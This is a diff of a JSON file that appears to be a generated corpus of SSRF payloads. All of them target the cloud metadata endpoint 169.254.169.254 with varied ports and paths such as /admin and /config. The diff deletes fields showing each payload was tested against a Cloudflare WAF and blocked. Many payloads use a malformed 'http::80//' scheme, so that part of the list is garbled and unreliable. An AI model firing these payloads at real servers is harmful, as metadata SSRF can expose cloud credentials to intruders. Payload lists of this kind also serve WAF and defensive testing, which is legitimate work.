@@ -10,12 +10,7 @@
       "payload": "http://169.254.169.254/latest/meta-data/",
       "description": "SSRF 169.254.169.254 port path",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4001",
@@ -24,12 +19,7 @@
       "payload": "http://169.254.169.254/latest/meta-data//admin",
       "description": "SSRF 169.254.169.254 port path/admin",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4002",
@@ -38,12 +28,7 @@
       "payload": "http://169.254.169.254/latest/meta-data//api",
       "description": "SSRF 169.254.169.254 port path/api",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4003",
@@ -52,12 +37,7 @@
       "payload": "http://169.254.169.254/latest/meta-data//config",
       "description": "SSRF 169.254.169.254 port path/config",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4004",
@@ -66,12 +46,7 @@
       "payload": "http://169.254.169.254/latest/meta-data//debug",
       "description": "SSRF 169.254.169.254 port path/debug",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4005",
@@ -80,12 +55,7 @@
       "payload": "http://169.254.169.254/latest/meta-data//status",
       "description": "SSRF 169.254.169.254 port path/status",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4006",
@@ -94,12 +64,7 @@
       "payload": "http://169.254.169.254/latest/meta-data//health",
       "description": "SSRF 169.254.169.254 port path/health",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4007",
@@ -108,12 +73,7 @@
       "payload": "http://169.254.169.254/latest/meta-data//metrics",
       "description": "SSRF 169.254.169.254 port path/metrics",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4008",
@@ -122,12 +82,7 @@
       "payload": "http::80//169.254.169.254/latest/meta-data/",
       "description": "SSRF 169.254.169.254 port:80 path",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4009",
@@ -136,12 +91,7 @@
       "payload": "http::80//169.254.169.254/latest/meta-data//admin",
       "description": "SSRF 169.254.169.254 port:80 path/admin",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4010",
@@ -150,12 +100,7 @@
       "payload": "http::80//169.254.169.254/latest/meta-data//api",
       "description": "SSRF 169.254.169.254 port:80 path/api",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4011",
@@ -164,12 +109,7 @@
       "payload": "http::80//169.254.169.254/latest/meta-data//config",
       "description": "SSRF 169.254.169.254 port:80 path/config",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4012",
@@ -178,12 +118,7 @@
       "payload": "http::80//169.254.169.254/latest/meta-data//debug",
       "description": "SSRF 169.254.169.254 port:80 path/debug",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4013",
@@ -192,12 +127,7 @@
       "payload": "http::80//169.254.169.254/latest/meta-data//status",
       "description": "SSRF 169.254.169.254 port:80 path/status",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4014",
@@ -206,12 +136,7 @@
       "payload": "http::80//169.254.169.254/latest/meta-data//health",
       "description": "SSRF 169.254.169.254 port:80 path/health",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4015",
@@ -220,12 +145,7 @@
       "payload": "http::80//169.254.169.254/latest/meta-data//metrics",
       "description": "SSRF 169.254.169.254 port:80 path/metrics",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4016",
@@ -234,12 +154,7 @@
       "payload": "http::443//169.254.169.254/latest/meta-data/",
       "description": "SSRF 169.254.169.254 port:443 path",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4017",
@@ -248,12 +163,7 @@
       "payload": "http::443//169.254.169.254/latest/meta-data//admin",
       "description": "SSRF 169.254.169.254 port:443 path/admin",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4018",
@@ -262,12 +172,7 @@
       "payload": "http::443//169.254.169.254/latest/meta-data//api",
       "description": "SSRF 169.254.169.254 port:443 path/api",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4019",
@@ -276,12 +181,7 @@
       "payload": "http::443//169.254.169.254/latest/meta-data//config",
       "description": "SSRF 169.254.169.254 port:443 path/config",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4020",
@@ -290,12 +190,7 @@
       "payload": "http::443//169.254.169.254/latest/meta-data//debug",
       "description": "SSRF 169.254.169.254 port:443 path/debug",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4021",
@@ -304,12 +199,7 @@
       "payload": "http::443//169.254.169.254/latest/meta-data//status",
       "description": "SSRF 169.254.169.254 port:443 path/status",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4022",
@@ -318,12 +208,7 @@
       "payload": "http::443//169.254.169.254/latest/meta-data//health",
       "description": "SSRF 169.254.169.254 port:443 path/health",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4023",
@@ -332,12 +217,7 @@
       "payload": "http::443//169.254.169.254/latest/meta-data//metrics",
       "description": "SSRF 169.254.169.254 port:443 path/metrics",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4024",
@@ -346,12 +226,7 @@
       "payload": "http::8080//169.254.169.254/latest/meta-data/",
       "description": "SSRF 169.254.169.254 port:8080 path",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4025",
@@ -360,12 +235,7 @@
       "payload": "http::8080//169.254.169.254/latest/meta-data//admin",
       "description": "SSRF 169.254.169.254 port:8080 path/admin",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4026",
@@ -374,12 +244,7 @@
       "payload": "http::8080//169.254.169.254/latest/meta-data//api",
       "description": "SSRF 169.254.169.254 port:8080 path/api",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4027",
@@ -388,12 +253,7 @@
       "payload": "http::8080//169.254.169.254/latest/meta-data//config",
       "description": "SSRF 169.254.169.254 port:8080 path/config",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4028",
@@ -402,12 +262,7 @@
       "payload": "http::8080//169.254.169.254/latest/meta-data//debug",
       "description": "SSRF 169.254.169.254 port:8080 path/debug",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4029",
@@ -416,12 +271,7 @@
       "payload": "http::8080//169.254.169.254/latest/meta-data//status",
       "description": "SSRF 169.254.169.254 port:8080 path/status",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4030",
@@ -430,12 +280,7 @@
       "payload": "http::8080//169.254.169.254/latest/meta-data//health",
       "description": "SSRF 169.254.169.254 port:8080 path/health",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4031",
@@ -444,12 +289,7 @@
       "payload": "http::8080//169.254.169.254/latest/meta-data//metrics",
       "description": "SSRF 169.254.169.254 port:8080 path/metrics",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4032",
@@ -458,12 +298,7 @@
       "payload": "http::8443//169.254.169.254/latest/meta-data/",
       "description": "SSRF 169.254.169.254 port:8443 path",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4033",
@@ -472,12 +307,7 @@
       "payload": "http::8443//169.254.169.254/latest/meta-data//admin",
       "description": "SSRF 169.254.169.254 port:8443 path/admin",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4034",
@@ -486,12 +316,7 @@
       "payload": "http::8443//169.254.169.254/latest/meta-data//api",
       "description": "SSRF 169.254.169.254 port:8443 path/api",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4035",
@@ -500,12 +325,7 @@
       "payload": "http::8443//169.254.169.254/latest/meta-data//config",
       "description": "SSRF 169.254.169.254 port:8443 path/config",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4036",
@@ -514,12 +334,7 @@
       "payload": "http::8443//169.254.169.254/latest/meta-data//debug",
       "description": "SSRF 169.254.169.254 port:8443 path/debug",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4037",
@@ -528,12 +343,7 @@
       "payload": "http::8443//169.254.169.254/latest/meta-data//status",
       "description": "SSRF 169.254.169.254 port:8443 path/status",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4038",
@@ -542,12 +352,7 @@
       "payload": "http::8443//169.254.169.254/latest/meta-data//health",
       "description": "SSRF 169.254.169.254 port:8443 path/health",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4039",
@@ -556,12 +361,7 @@
       "payload": "http::8443//169.254.169.254/latest/meta-data//metrics",
       "description": "SSRF 169.254.169.254 port:8443 path/metrics",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4040",
@@ -570,12 +370,7 @@
       "payload": "http::3000//169.254.169.254/latest/meta-data/",
       "description": "SSRF 169.254.169.254 port:3000 path",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4041",
@@ -584,12 +379,7 @@
       "payload": "http::3000//169.254.169.254/latest/meta-data//admin",
       "description": "SSRF 169.254.169.254 port:3000 path/admin",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4042",
@@ -598,12 +388,7 @@
       "payload": "http::3000//169.254.169.254/latest/meta-data//api",
       "description": "SSRF 169.254.169.254 port:3000 path/api",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4043",
@@ -612,12 +397,7 @@
       "payload": "http::3000//169.254.169.254/latest/meta-data//config",
       "description": "SSRF 169.254.169.254 port:3000 path/config",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4044",
@@ -626,12 +406,7 @@
       "payload": "http::3000//169.254.169.254/latest/meta-data//debug",
       "description": "SSRF 169.254.169.254 port:3000 path/debug",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4045",
@@ -640,12 +415,7 @@
       "payload": "http::3000//169.254.169.254/latest/meta-data//status",
       "description": "SSRF 169.254.169.254 port:3000 path/status",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4046",
@@ -654,12 +424,7 @@
       "payload": "http::3000//169.254.169.254/latest/meta-data//health",
       "description": "SSRF 169.254.169.254 port:3000 path/health",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4047",
@@ -668,12 +433,7 @@
       "payload": "http::3000//169.254.169.254/latest/meta-data//metrics",
       "description": "SSRF 169.254.169.254 port:3000 path/metrics",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4048",
@@ -682,12 +442,7 @@
       "payload": "http::5000//169.254.169.254/latest/meta-data/",
       "description": "SSRF 169.254.169.254 port:5000 path",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssrf-4049",
@@ -696,12 +451,7 @@
       "payload": "http::5000//169.254.169.254/latest/meta-data//admin",
       "description": "SSRF 169.254.169.254 port:5000 path/admin",
       "technique": "ssrf",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     }
   ]
 }
